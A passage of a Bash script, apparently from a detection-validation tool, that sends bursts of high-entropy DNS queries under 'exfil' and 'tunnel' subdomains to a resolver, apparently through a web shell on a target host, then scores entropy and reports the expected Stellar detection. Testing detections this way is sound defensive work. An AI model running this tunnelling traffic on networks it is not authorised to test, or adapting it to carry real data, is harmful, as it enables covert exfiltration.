  case " \${seen_fqs} " in *" \$1 "*) return 0;; esac
  seen_fqs="\${seen_fqs} \$1"; unique=\$((unique+1)); return 1
}
dns_track_fqdn(){
  local fq="\$1" lbl_len=0 ent=0
  fqdn_len_sum=\$((fqdn_len_sum + \${#fq}))
  [ \${#fq} -gt "\${max_fqdn_len}" ] && max_fqdn_len=\${#fq}
  lbl_len=\$(longest_label_len "\$fq")
  label_len_sum=\$((label_len_sum + lbl_len))
  [ "\${lbl_len}" -gt "\${max_label_len}" ] && max_label_len="\${lbl_len}"
  ent=\$(label_ent_score "\$(printf '%s' "\$fq" | cut -d. -f1)")
  ent_sum=\$((ent_sum + ent)); ent_n=\$((ent_n + 1))
}
run_q(){
  local fq="\$1" qt="\$2" out="" res="" dig_rc=0 sent_ok=no
  [ -z "\$ex1" ] && ex1="\$fq"; ex2="\$fq"; ex3="\$fq"
  generated=\$((generated+1))
  printf 'DNS_QUERY_GENERATED server=%s fqdn=%s qtype=%s tool=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  printf 'DNS_QUERY_ATTEMPT server=%s fqdn=%s qtype=%s tool=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  dns_track_fqdn "\$fq"
  if [ "\${tool}" = nslookup ]; then
    if [ "\$qt" = TXT ]; then out=\$(nslookup -timeout=2 -type=TXT "\$fq" "\$srv" 2>&1); else out=\$(nslookup -timeout=2 "\$fq" "\$srv" 2>&1); fi
  elif [ "\${tool}" = host ]; then
    if [ "\$qt" = TXT ]; then out=\$(host -W 2 -t TXT "\$fq" "\$srv" 2>&1); else out=\$(host -W 2 -t A "\$fq" "\$srv" 2>&1); fi
  else
    if [ "\$qt" = TXT ]; then out=\$(dig +time=2 +tries=1 @"\$srv" "\$fq" TXT +noall +answer +comments 2>&1)
    else out=\$(dig +time=2 +tries=1 @"\$srv" "\$fq" A +noall +answer +comments 2>&1); fi
  fi
  dig_rc=\$?
  case "\$out" in
    *"dig: not found"*|*"nslookup: not found"*|*"host: not found"*|*"command not found"*)
      printf 'DNS_QUERY_SENT server=%s fqdn=%s qtype=%s tool=%s exit_code=%s sent=no reason=tool_unavailable\n' "\$srv" "\$fq" "\$qt" "\${tool}" "\$dig_rc"
      return 0
      ;;
  esac
  sent=\$((sent+1))
  printf 'DNS_QUERY_SENT server=%s fqdn=%s qtype=%s tool=%s exit_code=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}" "\$dig_rc"
  if dns_to "\$out"; then
    to=\$((to+1)); fail=\$((fail+1)); res=timeout
    printf 'DNS_QUERY_TIMEOUT server=%s fqdn=%s qtype=%s tool=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  elif dns_nx "\$out"; then
    nx=\$((nx+1)); res=nxdomain
    printf 'DNS_QUERY_SUCCESS server=%s fqdn=%s qtype=%s result=nxdomain tool=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  elif dns_err "\$out"; then
    err=\$((err+1)); fail=\$((fail+1)); res=error
    printf 'DNS_QUERY_ERROR server=%s fqdn=%s qtype=%s tool=%s detail=resolver_error\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  else
    resolved=\$((resolved+1)); res=resolved
    printf 'DNS_QUERY_SUCCESS server=%s fqdn=%s qtype=%s result=resolved tool=%s\n' "\$srv" "\$fq" "\$qt" "\${tool}"
  fi
  responded=\$((responded+1))
  attempted=\$((attempted+1))
  printf 'DNS_QUERY_RESPONSE server=%s fqdn=%s qtype=%s result=%s tool=%s\n' "\$srv" "\$fq" "\$qt" "\$res" "\${tool}"
  dns_fqdn_seen "\$fq" || true
  [ "\$qt" = TXT ] && txtq=\$((txtq+1)) || a=\$((a+1))
  printf 'DNS_TUNNEL_QUERY_EXEC server=%s query=%s qtype=%s result=%s\n' "\$srv" "\$fq" "\$qt" "\$res"
}
i=1
while [ "\$i" -le "\$planned" ]; do
  mod=\$((i % 10))
  if [ "\$mod" -lt 4 ]; then
    rl=\$(randb64url \$((28 + RANDOM % 20))); run_q "\${rl}.exfil.\${dom}" TXT
  elif [ "\$mod" -lt 8 ]; then
    rl=\$(randb64url \$((32 + RANDOM % 16))); sub=\$(randlbl32 \$((6 + RANDOM % 6))); run_q "\${rl}.\${sub}.\${dom}" A
  else
    rl=\$(randlbl32 \$((24 + RANDOM % 12))); p=\$(randlbl 5); run_q "\${p}.\${rl}.tunnel.\${dom}" A
  fi
  i=\$((i + 1))
done
avg_fqdn=0; avg_label=0; entropy_score=0
[ "\$attempted" -gt 0 ] && avg_fqdn=\$((fqdn_len_sum / attempted))
[ "\$ent_n" -gt 0 ] && entropy_score=\$((ent_sum / ent_n))
[ "\$ent_n" -gt 0 ] && avg_label=\$((label_len_sum / ent_n))
echo "DNS_TUNNEL_STATISTICS queries=\${attempted} unique_queries=\${unique} average_length=\${avg_fqdn} avg_fqdn_length=\${avg_fqdn} avg_label_length=\${avg_label} max_label_length=\${max_label_len} entropy_score=\${entropy_score} txt_queries=\${txtq} a_queries=\${a} nxdomain=\${nx} resolved=\${resolved} query_generated=\${generated} query_sent=\${sent} query_responded=\${responded}"
printf 'DNS_TUNNEL_SIM_STATS attempted=%s planned=%s unique=%s success=%s fail=%s nx=%s resolved=%s timeout=%s error=%s a=%s txt=%s avg_fqdn=%s max_fqdn=%s avg_label=%s max_label=%s entropy=%s query_generated=%s query_sent=%s query_responded=%s mode=${mode} server=%s tool=${tool} campaign=${campaign} ex1=%s ex2=%s ex3=%s\n' \
  "\$attempted" "\$planned" "\$unique" "\$attempted" "\$fail" "\$nx" "\$resolved" "\$to" "\$err" "\$a" "\$txtq" "\$avg_fqdn" "\$max_fqdn_len" "\$avg_label" "\$max_label_len" "\$entropy_score" "\$generated" "\$sent" "\$responded" "\$srv" "\$ex1" "\$ex2" "\$ex3"
EOF
    dns_remote_script_close 'DNS_TUNNEL_SIM_SCRIPT'
}


parse_dns_tunnel_sim_stats_line() {
    local out="$1" line
    local attempted=0 success=0 fail=0 nx=0 timeout=0 a=0 txt=0 avg=0 max=0 entropy=0 ex1="" ex2="" ex3=""
    local planned=0 unique=0 resolved=0 error=0 avg_label=0 max_label=0
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_TUNNEL_SIM_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(dns_stats_field_from_line "${line}" attempted)")
        planned=$(safe_int "$(dns_stats_field_from_line "${line}" planned)")
        unique=$(safe_int "$(dns_stats_field_from_line "${line}" unique)")
        success=$(safe_int "$(dns_stats_field_from_line "${line}" success)")
        fail=$(safe_int "$(dns_stats_field_from_line "${line}" fail)")
        nx=$(safe_int "$(dns_stats_field_from_line "${line}" nx)")
        resolved=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
        timeout=$(safe_int "$(dns_stats_field_from_line "${line}" timeout)")
        error=$(safe_int "$(dns_stats_field_from_line "${line}" error)")
        a=$(safe_int "$(dns_stats_field_from_line "${line}" a)")
        txt=$(safe_int "$(dns_stats_field_from_line "${line}" txt)")
        avg=$(safe_int "$(dns_stats_field_from_line "${line}" avg_fqdn)")
        max=$(safe_int "$(dns_stats_field_from_line "${line}" max_fqdn)")
        avg_label=$(safe_int "$(dns_stats_field_from_line "${line}" avg_label)")
        max_label=$(safe_int "$(dns_stats_field_from_line "${line}" max_label)")
        entropy=$(safe_int "$(dns_stats_field_from_line "${line}" entropy)")
        ex1=$(dns_stats_field_from_line "${line}" ex1)
        ex2=$(dns_stats_field_from_line "${line}" ex2)
        ex3=$(dns_stats_field_from_line "${line}" ex3)
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s' \
        "${attempted}" "${planned}" "${unique}" "${success}" "${fail}" "${nx}" "${resolved}" "${timeout}" "${error}" \
        "${a}" "${txt}" "${avg}" "${max}" "${entropy}" "${ex1}" "${ex2}" "${ex3}" "${avg_label}" "${max_label}"
}

parse_dns_tunnel_query_exec_lines() {
    local out="$1" line server query qtype result
    while IFS= read -r line; do
        [[ "${line}" != *"DNS_TUNNEL_QUERY_EXEC"* ]] && continue
        server=$(dns_stats_field_from_line "${line}" server)
        query=$(dns_stats_field_from_line "${line}" query)
        qtype=$(dns_stats_field_from_line "${line}" qtype)
        result=$(dns_stats_field_from_line "${line}" result)
        log_dns_tunnel_query_exec "${server}" "${query}" "${qtype}" "${result}"
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_TUNNEL_QUERY_EXEC' || true)"
}

aggregate_dns_query_telemetry_from_output() {
    local out="$1" line="" attempts=0 unique_fqs="" fq="" nx=0 resolved=0 timeout=0 error=0 responded=0
    aggregate_dns_query_verification_from_output "${out}" "dns_tunnel" || true
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        case "${line}" in
            DNS_QUERY_ATTEMPT*)
                attempts=$((attempts + 1))
                fq=$(dns_stats_field_from_line "${line}" fqdn)
                [[ -z "${fq}" ]] && fq=$(dns_stats_field_from_line "${line}" query)
                case " ${unique_fqs} " in
                    *" ${fq} "*) ;;
                    *) unique_fqs="${unique_fqs} ${fq}" ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_RESPONSE*)
                responded=$((responded + 1))
                case "${line}" in
                    *result=nxdomain*) nx=$((nx + 1)) ;;
                    *result=resolved*) resolved=$((resolved + 1)) ;;
                    *result=timeout*) timeout=$((timeout + 1)) ;;
                    *result=error*) error=$((error + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_SUCCESS*)
                [[ "${out}" == *DNS_QUERY_RESPONSE* ]] && continue
                case "${line}" in
                    *result=nxdomain*) nx=$((nx + 1)) ;;
                    *result=resolved*) resolved=$((resolved + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_TIMEOUT*)
                timeout=$((timeout + 1))
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_ERROR*)
                error=$((error + 1))
                log_dns_tunnel_query_telemetry "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_QUERY_(ATTEMPT|RESPONSE|SUCCESS|TIMEOUT|ERROR)' || true)"
    if (( responded > 0 )); then
        attempts="${responded}"
    fi
    if (( attempts > 0 )); then
        DNS_QUERIES_ATTEMPTED="${attempts}"
        DNS_TUNNEL_UNIQUE_QUERIES=$(safe_int "$(printf '%s' "${unique_fqs}" | awk '{c=0; for(i=1;i<=NF;i++) if($i!="") c++; print c+0}')")
        (( nx > 0 )) && DNS_TUNNEL_NXDOMAIN_COUNT="${nx}"
        (( resolved > 0 )) && DNS_TUNNEL_RESOLVED_COUNT="${resolved}"
        (( timeout > 0 )) && DNS_TUNNEL_TIMEOUT_COUNT="${timeout}"
        (( error > 0 )) && DNS_TUNNEL_ERROR_COUNT="${error}"
        DNS_RESPONSES_RECEIVED=$((nx + resolved + timeout + error))
        (( DNS_RESPONSES_RECEIVED < 1 )) && DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${DNS_RESPONSES_RECEIVED}"
        apply_dns_actual_counts_for_judgment
        return 0
    fi
    return 1
}

reset_dns_tunnel_execution_stats() {
    DNS_QUERIES_ATTEMPTED=0
    DNS_RESPONSES_RECEIVED=0
    DNS_TUNNEL_SUCCESS_COUNT=0
    DNS_TUNNEL_FAILURE_COUNT=0
    DNS_TUNNEL_NXDOMAIN_COUNT=0
    DNS_TUNNEL_TIMEOUT_COUNT=0
    DNS_TUNNEL_ERROR_COUNT=0
    DNS_TUNNEL_RESOLVED_COUNT=0
    DNS_TUNNEL_UNIQUE_QUERIES=0
    DNS_A_QUERIES=0
    DNS_TXT_QUERIES=0
    DNS_TUNNEL_FQDN_LEN_SUM=0
    DNS_TUNNEL_FQDN_LEN_MAX=0
    DNS_TUNNEL_FQDN_COUNT=0
    DNS_TUNNEL_APPROX_ENTROPY=0
    reset_dns_query_verification_stats
}

finalize_dns_tunnel_stage_judgment() {
    local stage_label="$1" detail_prefix="${2:-}"
    local detail="" stage_msg="" stage_rc="Failed"
    DNS_QUERIES_ATTEMPTED=$(safe_int "${DNS_QUERIES_ATTEMPTED}")
    DNS_TUNNEL_UNIQUE_QUERIES=$(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}")
    dns_compute_tunnel_detection_likelihood
    if (( DNS_QUERIES_ATTEMPTED == 0 || DNS_TUNNEL_UNIQUE_QUERIES == 0 )); then
        DNS_TUNNEL_STAGE_STATUS="failed"
        stage_rc="Failed"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-zero queries (attempted=${DNS_QUERIES_ATTEMPTED} unique=${DNS_TUNNEL_UNIQUE_QUERIES})}"
        detail="${DNS_TUNNEL_SKIP_REASON} planned=${DNS_QUERIES_PLANNED:-0} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}"
        set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    elif dns_tunnel_meets_detection_success; then
        DNS_TUNNEL_STAGE_STATUS="success"
        stage_rc="Success"
        detail="${detail_prefix}attempted=${DNS_QUERIES_ATTEMPTED} unique=${DNS_TUNNEL_UNIQUE_QUERIES} entropy=${DNS_TUNNEL_APPROX_ENTROPY:-0} likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD} planned=${DNS_QUERIES_PLANNED:-0} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}"
        set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    elif (( DNS_QUERIES_ATTEMPTED > 0 && DNS_TUNNEL_UNIQUE_QUERIES > 0 )); then
        DNS_TUNNEL_STAGE_STATUS="partial"
        stage_rc="Partial"
        detail="${detail_prefix}attempted=${DNS_QUERIES_ATTEMPTED} unique=${DNS_TUNNEL_UNIQUE_QUERIES} entropy=${DNS_TUNNEL_APPROX_ENTROPY:-0} likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD} reason=${DNS_TUNNEL_DETECTION_REASON:-detection_criteria_not_met} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}"
        set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    else
        DNS_TUNNEL_STAGE_STATUS="failed"
        stage_rc="Failed"
        detail="${DNS_TUNNEL_SKIP_REASON:-failed} planned=${DNS_QUERIES_PLANNED:-0}"
        set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    fi
    stage_msg="DNS_STAGE_FINAL_SUMMARY stage=${stage_label} status=${DNS_TUNNEL_STAGE_STATUS} planned=${DNS_QUERIES_PLANNED:-0} attempted=${DNS_QUERIES_ATTEMPTED} unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} detection_likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} result=${DNS_TUNNEL_STAGE_STATUS}"
    [[ "${DNS_TUNNEL_STAGE_STATUS}" == failed && -n "${DNS_TUNNEL_LAST_ROOT_CAUSE:-}" ]] && stage_msg+=" root_cause=${DNS_TUNNEL_LAST_ROOT_CAUSE}"
    dns_tunnel_log_both "${stage_msg}"
    [[ "${DNS_TUNNEL_STAGE_STATUS}" == success ]]
}

reset_dns_tunnel_enhanced_fallback_stats() {
    DNS_TUNNEL_ENH_ATTEMPTED=0
    DNS_TUNNEL_ENH_SUCCESS=0
    DNS_TUNNEL_ENH_FAIL=0
    DNS_TUNNEL_ENH_NX=0
    DNS_TUNNEL_ENH_TIMEOUT=0
    DNS_TUNNEL_ENH_RESULT="skipped"
    DNS_TUNNEL_ENH_REASON=""
    DNS_TUNNEL_FB_USED="no"
    DNS_TUNNEL_FB_REASON=""
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_SUCCESS=0
    DNS_TUNNEL_FB_FAIL=0
    DNS_TUNNEL_FB_NX=0
    DNS_TUNNEL_FB_TIMEOUT=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_TUNNEL_FINAL_RESULT="failed"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
    DNS_TUNNEL_FINAL_REASON=""
}

snapshot_dns_tunnel_enhanced_run_stats() {
    local sim_rc="$1" sim_ran="$2"
    DNS_TUNNEL_ENH_ATTEMPTED=$(safe_int "${DNS_QUERIES_ATTEMPTED}")
    DNS_TUNNEL_ENH_SUCCESS=$(safe_int "${DNS_TUNNEL_SUCCESS_COUNT}")
    DNS_TUNNEL_ENH_FAIL=$(safe_int "${DNS_TUNNEL_FAILURE_COUNT}")
    DNS_TUNNEL_ENH_NX=$(safe_int "${DNS_TUNNEL_NXDOMAIN_COUNT}")
    DNS_TUNNEL_ENH_TIMEOUT=$(safe_int "${DNS_TUNNEL_TIMEOUT_COUNT}")
    if [[ "${sim_ran}" != true ]]; then
        DNS_TUNNEL_ENH_RESULT="skipped"
        DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_SKIP_REASON:-sim_not_run}"
    elif (( DNS_TUNNEL_ENH_ATTEMPTED > 0 )); then
        DNS_TUNNEL_ENH_RESULT="success"
        DNS_TUNNEL_ENH_REASON="ok"
    else
        DNS_TUNNEL_ENH_RESULT="failed"
        DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_SKIP_REASON:-zero_queries}"
    fi
}

record_dns_tunnel_enhanced_result() {
    local msg="DNS_TUNNEL_ENHANCED_RESULT attempted=${DNS_TUNNEL_ENH_ATTEMPTED} success=${DNS_TUNNEL_ENH_SUCCESS} fail=${DNS_TUNNEL_ENH_FAIL} nx=${DNS_TUNNEL_ENH_NX} timeout=${DNS_TUNNEL_ENH_TIMEOUT} result=${DNS_TUNNEL_ENH_RESULT} reason=${DNS_TUNNEL_ENH_REASON}"
    state_append "dns_tunnel_enhanced_result.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

record_dns_tunnel_fallback_result() {
    local msg="DNS_TUNNEL_FALLBACK_RESULT used=${DNS_TUNNEL_FB_USED} reason=${DNS_TUNNEL_FB_REASON} attempted=${DNS_TUNNEL_FB_ATTEMPTED} success=${DNS_TUNNEL_FB_SUCCESS} fail=${DNS_TUNNEL_FB_FAIL} nx=${DNS_TUNNEL_FB_NX} timeout=${DNS_TUNNEL_FB_TIMEOUT} result=${DNS_TUNNEL_FB_RESULT}"
    state_append "dns_tunnel_fallback_result.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

apply_dns_tunnel_enhanced_final_decision() {
    local stage_label="DNS Tunnel Enhanced" detail_prefix="dns enhanced "
    local total_attempted=$((DNS_TUNNEL_ENH_ATTEMPTED + DNS_TUNNEL_FB_ATTEMPTED))

    DNS_TUNNEL_FINAL_RESULT="failed"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
    DNS_TUNNEL_FINAL_REASON="${DNS_TUNNEL_SKIP_REASON:-no_queries}"

    if [[ "${DNS_TUNNEL_ENH_RESULT}" == success && DNS_TUNNEL_ENH_ATTEMPTED -gt 0 && $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") -gt 0 ]] && dns_tunnel_meets_detection_success; then
        DNS_TUNNEL_FINAL_RESULT="success"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="enhanced"
        DNS_TUNNEL_FINAL_REASON="enhanced_ok entropy=${DNS_TUNNEL_APPROX_ENTROPY:-0} likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    elif [[ "${DNS_TUNNEL_ENH_RESULT}" == success && DNS_TUNNEL_ENH_ATTEMPTED -gt 0 && $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") -gt 0 ]]; then
        DNS_TUNNEL_FINAL_RESULT="partial"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="enhanced"
        DNS_TUNNEL_FINAL_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_criteria_not_met}"
    elif [[ "${DNS_TUNNEL_FB_USED}" == yes && DNS_TUNNEL_FB_ATTEMPTED -gt 0 && DNS_TUNNEL_ENH_ATTEMPTED -eq 0 ]]; then
        DNS_TUNNEL_FINAL_RESULT="partial"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="fallback"
        DNS_TUNNEL_FINAL_REASON="${DNS_TUNNEL_ENH_REASON:-enhanced_failed}_fallback_ok"
    elif [[ "${DNS_TUNNEL_FB_USED}" == yes && DNS_TUNNEL_FB_ATTEMPTED -gt 0 && DNS_TUNNEL_ENH_ATTEMPTED -gt 0 ]]; then
        DNS_TUNNEL_FINAL_RESULT="partial"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="fallback"
        DNS_TUNNEL_FINAL_REASON="enhanced_partial_fallback_ok"
    elif [[ "${DNS_TUNNEL_ENH_RESULT}" == skipped && total_attempted -eq 0 ]]; then
        DNS_TUNNEL_FINAL_RESULT="skipped"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
        DNS_TUNNEL_FINAL_REASON="${DNS_TUNNEL_ENH_REASON:-skipped}"
    fi

    if (( total_attempted == 0 )); then
        [[ "${DNS_TUNNEL_ENH_RESULT}" == skipped ]] && DNS_TUNNEL_FINAL_RESULT="skipped" || DNS_TUNNEL_FINAL_RESULT="failed"
        DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
        DNS_TUNNEL_FINAL_REASON="${DNS_TUNNEL_ENH_REASON:-${DNS_TUNNEL_SKIP_REASON:-no_queries}}"
    fi

    DNS_QUERIES_ATTEMPTED="${total_attempted}"
    if [[ "${DNS_TUNNEL_FINAL_RESULT}" == success && total_attempted -gt 0 && $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") -gt 0 ]]; then
        DNS_RESPONSES_RECEIVED="${DNS_TUNNEL_ENH_SUCCESS:-${total_attempted}}"
    elif (( DNS_TUNNEL_FB_ATTEMPTED > 0 )); then
        DNS_RESPONSES_RECEIVED="${DNS_TUNNEL_FB_SUCCESS:-${DNS_TUNNEL_FB_ATTEMPTED}}"
    fi

    local decision_msg="DNS_TUNNEL_FINAL_DECISION result=${DNS_TUNNEL_FINAL_RESULT} successful_mode=${DNS_TUNNEL_FINAL_SUCCESSFUL_MODE} reason=${DNS_TUNNEL_FINAL_REASON}"
    state_append "dns_tunnel_final_decision.log" "${decision_msg}"
    dns_tunnel_log_both "${decision_msg}"

    case "${DNS_TUNNEL_FINAL_RESULT}" in
        success)
            DNS_TUNNEL_STAGE_STATUS="success"
            set_stage_result "${stage_label}" "Success" "${detail_prefix}attempted=${total_attempted} mode=enhanced"
            ;;
        partial)
            DNS_TUNNEL_STAGE_STATUS="partial"
            set_stage_result "${stage_label}" "Partial" "${detail_prefix}successful_mode=fallback attempted=${total_attempted} reason=${DNS_TUNNEL_FINAL_REASON}"
            ;;
        skipped)
            DNS_TUNNEL_STAGE_STATUS="skipped"
            set_stage_result "${stage_label}" "Skipped" "${DNS_TUNNEL_FINAL_REASON}"
            ;;
        *)
            DNS_TUNNEL_STAGE_STATUS="failed"
            set_stage_result "${stage_label}" "Failed" "${DNS_TUNNEL_FINAL_REASON}"
            ;;
    esac
    log_detection_quality "DNS Tunnel" "${DNS_QUERIES_ATTEMPTED:-0}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS:-90}" \
        "${DNS_TARGET_SERVER:-1}" "dns_tunnel_entropy" \
        "${DNS_TUNNEL_DETECTION_LIKELIHOOD,,}" \
        "${DNS_TUNNEL_DETECTION_REASON:-${DNS_QUERIES_ATTEMPTED:-0} DNS tunnel queries against ${DNS_TARGET_SERVER:-resolver}}"
    compute_detection_score_dns_tunnel
}

apply_dns_tunnel_sim_stats_to_globals() {
    local attempted="$1" planned="$2" unique="$3" success="$4" fail="$5" nx="$6" resolved="$7" timeout="$8" error="$9"
    local a="${10}" txt="${11}" avg="${12}" max="${13}" entropy="${14}" avg_label="${15:-0}" max_label="${16:-0}"
    DNS_QUERIES_ATTEMPTED="${attempted}"
    DNS_QUERIES_PLANNED="${planned:-${DNS_QUERIES_PLANNED:-0}}"
    DNS_TUNNEL_UNIQUE_QUERIES="${unique}"
    DNS_RESPONSES_RECEIVED="${success}"
    DNS_TUNNEL_SUCCESS_COUNT="${success}"
    DNS_TUNNEL_FAILURE_COUNT="${fail}"
    DNS_TUNNEL_NXDOMAIN_COUNT="${nx}"
    DNS_TUNNEL_RESOLVED_COUNT="${resolved}"
    DNS_TUNNEL_TIMEOUT_COUNT="${timeout}"
    DNS_TUNNEL_ERROR_COUNT="${error}"
    DNS_A_QUERIES="${a}"
    DNS_TXT_QUERIES="${txt}"
    DNS_TUNNEL_FQDN_LEN_SUM=$((avg * attempted))
    DNS_TUNNEL_FQDN_LEN_MAX="${max}"
    DNS_TUNNEL_FQDN_COUNT="${attempted}"
    DNS_TUNNEL_LABEL_LEN_SUM=$((avg_label * attempted))
    DNS_TUNNEL_LABEL_LEN_MAX="${max_label}"
    DNS_TUNNEL_LABEL_COUNT="${attempted}"
    DNS_TUNNEL_APPROX_ENTROPY="${entropy}"
    DNS_HIGH_ENTROPY_LABELS="${entropy}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT="${entropy}"
    DNS_CLUSTER_LOCAL_COUNT=0
    DNS_EFFECTIVE_TLD_COUNT="${attempted}"
    DNS_SUSPICIOUS_TLD_COUNT=$((attempted * 30 / 100))
    dns_compute_tunnel_detection_likelihood
}

write_dns_tunnel_report() {
    local examples="${DNS_TUNNEL_PAYLOAD_EXAMPLES:-n/a}"
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## DNS Tunnel Simulation Summary

| Field | Value |
|---|---|
| DNS server discovery | ${DNS_TARGET_SELECTION_SOURCE:-unknown} (${DNS_TARGET_SELECTION_DETAIL:-n/a}) |
| Fallback resolver used | ${DNS_TUNNEL_FALLBACK_RESOLVER} |
| Target resolver | ${DNS_TARGET_SERVER:-n/a} |
| Mode | ${DNS_TUNNEL_MODE_USED:-${DNS_TUNNEL_MODE}} |
| Domain suffix | ${DNS_TUNNEL_DOMAIN_SUFFIX} |
| Query tool | ${DNS_TUNNEL_QUERY_TOOL:-n/a} |
| Planned query count | ${DNS_QUERIES_PLANNED:-0} |
| Actual sent query count | ${DNS_QUERIES_ATTEMPTED:-0} |
| Success count | ${DNS_TUNNEL_SUCCESS_COUNT:-0} |
| Failure count | ${DNS_TUNNEL_FAILURE_COUNT:-0} |
| NXDOMAIN count | ${DNS_TUNNEL_NXDOMAIN_COUNT:-0} |
| Timeout count | ${DNS_TUNNEL_TIMEOUT_COUNT:-0} |
| Query types (A/TXT) | ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0} |
| Average FQDN length | $(( DNS_TUNNEL_FQDN_COUNT > 0 ? DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT : 0 )) |
| Max FQDN length | ${DNS_TUNNEL_FQDN_LEN_MAX:-0} |
| Approximate entropy indicator | ${DNS_TUNNEL_APPROX_ENTROPY:-0} |
| Skip / failure reason | ${DNS_TUNNEL_SKIP_REASON:-none} |

### Generated payload pattern examples
$(printf '%b' "${examples}")

### Expected Stellar detection
- **Detection name:** DNS Tunneling Anomaly (\`dns_tunnel\`)
- **Tactic / Technique:** Exfiltration (TA0010) / T1048 — Exfiltration Over Alternative Protocol
- **Reason this traffic should be detected:**
  - High query count (${DNS_QUERIES_ATTEMPTED:-0}) in a short burst window (~5 minutes)
  - Repeated burst compared to typical DNS baseline volume
  - Long service-like subdomains (cluster.local / infrastructure prefixes)
  - High-entropy synthetic labels (base32/base64url style)
  - TXT query burst (txt-burst / infrastructure modes)
  - Abnormal DNS volume vs typical baseline (Stellar ML: tunneled high-entropy traffic)

EOF
}

run_dns_tunnel_simulation_once() {
    local planned_count="$1" mode="$2" dns_server="$3" resolver_source="$4" resolver_reason="$5"
    local tool="" out="" dns_cmd payload_bytes saved_ws_method dw_met=no dw_likelihood=low
    local attempted=0 planned=0 unique=0 success=0 fail=0 nx=0 resolved=0 timeout=0 error=0
    local a=0 txt=0 avg=0 max=0 entropy=0 ex1="" ex2="" ex3="" t0=0 t1=0 elapsed=0
    dns_server=$(poc_extract_ipv4 "${dns_server}")
    [[ -z "${dns_server}" ]] && return 1
    planned_count=$(resolve_dns_detection_window_plan "${planned_count}")
    if ! resolve_dns_tunnel_query_tool; then
        return 1
    fi
    log_detection_window_plan "DNS_Tunnel" "${dns_server}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
        "dns_queries>=${planned_count}" "${planned_count}" \
        "single_resolver_concentrated_burst_stellar_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
    log_detection_window_progress "DNS_Tunnel" "${dns_server}" "0" "0" "dns_queries>=${planned_count}" "no"
    log_dns_tunnel_selected_resolver "${dns_server}" "${resolver_source}" "${resolver_reason}"
